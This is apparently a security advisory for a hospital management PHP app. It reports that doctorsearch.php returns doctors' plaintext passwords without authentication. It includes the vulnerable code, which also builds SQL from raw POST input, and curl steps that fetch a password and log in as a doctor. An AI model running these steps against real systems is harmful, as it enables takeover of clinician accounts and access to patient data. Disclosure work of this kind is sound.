### Title

`doctorsearch.php` returns the plaintext password of any doctor in the response

### Summary

The `doctorsearch.php` endpoint queries the `doctb` table by email and renders the resulting row in an HTML table that includes the `password` column. The endpoint is reachable without authentication and does not redact the password. An attacker who knows (or guesses) a doctor's email address can read the plaintext password and authenticate as that doctor.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Exposure of Sensitive Information Through Data Queries (CWE-200)

### Affected Code

File: `doctorsearch.php`

```php
$contact=$_POST['doctor_contact'];
$query = "select * from doctb where email= '$contact'";
$result = mysqli_query($con,$query);
$row=mysli_fetch_array($result);
...
$username = $row['username'];
$password = $row['password'];
$email = $row['email'];
$docFees = $row['docFees'];
echo "<tr>
    <td>$username</td>
    <td>$password</td>
    <td>$email</td>
    <td>$docFees</td>
</tr>";
```

### Root Cause

The endpoint selects the entire `*` row and then renders every column, including the secret `password` column. There is no field allowlist and no `htmlspecialchars()` call. The endpoint is also reachable without any session check.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Request the password of a known doctor. The endpoint requires no session.

```bash
curl -sS "$BASE_URL/doctorsearch.php" \
  --data-urlencode "doctor_search_submit=1" \
  --data-urlencode "doctor_contact=ashok@gmail.com" \
  | grep -E "<td>" | head -10
```

```html
<table>
  <thead>
    <tr>
      <th>Username</th>
      <th>Password</th>
      <th>Email</th>
      <th>Consultancy Fees</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>ashok</td>
      <td>ashok123</td>
      <td>ashok@gmail.com</td>
      <td>500</td>
    </tr>
  </tbody>
</table>
```

The response contains the plaintext password `ashok123` for the doctor `ashok`.

3. Confirm the same value works as the authentication credential:

```bash
curl -sS -i "$BASE_URL/func1.php" \
  --data-urlencode "docsub1=1" \
  --data-urlencode "username3=ashok" \
  --data-urlencode "password3=ashok123" | head -10
```

```text
HTTP/1.1 302 Found
Location: doctor-panel.php
```

4. The same column is also rendered in the receptionist dashboard (`admin-panel1.php` Doctor List tab, `echo "<td>$password</td>"`); the same plaintext password is exposed via the dashboard to anyone who can reach `admin-panel1.php` (which is equally unauthenticated — see CVE-09).

### Impact

`doctorsearch.php` returns the plaintext password of every doctor in the system. Because the endpoint is reachable without authentication, an attacker can:

- Enumerate doctor emails via the `patientsearch.php` `demail` column, the appointment booking flow, or the `myhmsdb.sql` seed file.
- Read the password of any doctor by POSTing the email to `doctorsearch.php`.
- Authenticate as the doctor (`func1.php`) and pivot to the doctor dashboard, which lists every appointment and exposes the prescription data.

Because the same `password` column is also exposed in the receptionist dashboard and the patient search endpoint, the disclosure spans every user role in the application.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score: 7.5 (High)
```
